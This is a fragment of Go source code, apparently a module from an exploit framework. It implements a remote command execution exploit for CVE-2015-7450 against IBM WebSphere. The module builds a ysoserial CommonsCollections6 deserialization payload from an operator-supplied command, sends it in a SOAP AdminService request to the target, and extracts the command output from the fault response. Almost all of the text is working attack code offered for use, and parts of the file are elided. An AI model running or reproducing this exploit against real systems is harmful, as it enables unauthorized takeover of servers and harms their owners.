...
type Exp_CVE_2015_7450 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2015_7450) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 默认配置
	headers := self.GetInitExpHeaders()
	headers.Set("SOAPAction", "urn:AdminService")
	headers.Set("Content-Type", "text/xml")
	payload := gadgets.YsoserialPayloadGenerator("CommonCollections6DefiningClassLoaderErrorEcho", cmd)
...
<params xsi:type="ns1:[Ljava.lang.Object;">{{params}}</params>
<signature xsi:type="ns1:[Ljava.lang.String;">rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ACRjb20uaWJtLndlYnNwaGVyZS5tYW5hZ2VtZW50LlNlc3Npb24=</signature>
	...
	body = strings.Replace(body, "{{params}}", base64.StdEncoding.EncodeToString(payload), 1)
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, body, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	pattern := regexp.MustCompile(`<faultstring>(.*?)</faultstring>`)
	tmp := pattern.FindStringSubmatch(httpresp.Body)
	if len(tmp) > 1 {
		self.EchoSuccessMsg("漏洞存在")
		resultBytes, err := base64.StdEncoding.DecodeString(tmp[1])
		if err != nil {
			expResult.Err = httpresp.Err.Error()
			return
		}
		var result string
		self.EchoDebugMsg(string(resultBytes))
		result, err = self.ParserPlainCmdResult(string(resultBytes))
		if err != nil {
			expResult.Err = httpresp.Err.Error()
			return
		}
...
func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2015_7450{}, "exp_CVE_2015_7450.yml")
